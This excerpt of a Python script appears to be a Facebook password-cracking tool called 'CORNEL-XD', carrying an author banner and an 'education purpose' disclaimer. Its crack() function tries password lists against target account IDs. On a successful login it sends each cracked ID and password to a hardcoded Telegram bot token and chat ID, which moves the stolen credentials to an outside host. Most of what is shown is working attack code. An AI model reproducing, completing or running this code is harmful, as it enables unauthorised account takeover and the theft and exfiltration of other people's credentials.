...
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/profile.php?id=10092937211')
	back()
def linex():
	print('\033[1;37m----------------------------------------------')
...
╚══════╝╚═╝░░░░░╚═╝░░░╚═╝░░░\u001b[31mv4
\033[1;37m----------------------------------------------
 AUTHOR     : BIPIN X SADIR
 GITHUB     : lmvprojects
 NOTE   : THIS TOOL IS USED FOR EDUCATION PURPOSE
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[CORNEL-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.get("https://api.telegram.org/bot5400833535:AAGnk0bRjWrhCFsqgKdl7xlFmNhW5GrQouE/sendMessage?chat_id=5728361296"+tid+"&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
				ok.append(wrt)
				break
			else:
				continue
